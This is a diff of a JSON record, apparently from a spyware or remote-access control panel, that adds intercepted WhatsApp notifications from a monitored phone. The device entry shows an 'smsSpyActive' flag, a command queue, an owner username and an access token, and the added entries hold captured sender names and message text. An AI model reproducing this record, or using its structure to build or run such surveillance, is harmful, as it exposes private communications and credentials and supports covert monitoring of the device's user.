@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927060894,
+    "lastSeen": 1775927063828,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (8 pesan): ~ kkdap catalyst/reality",
+        "content": "28rapp",
+        "time": "12/04 00:04",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927065400
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎7 pesan baru",
+        "time": "12/04 00:04",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927062028
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (7 pesan): ~ tapzyUrPrblm",
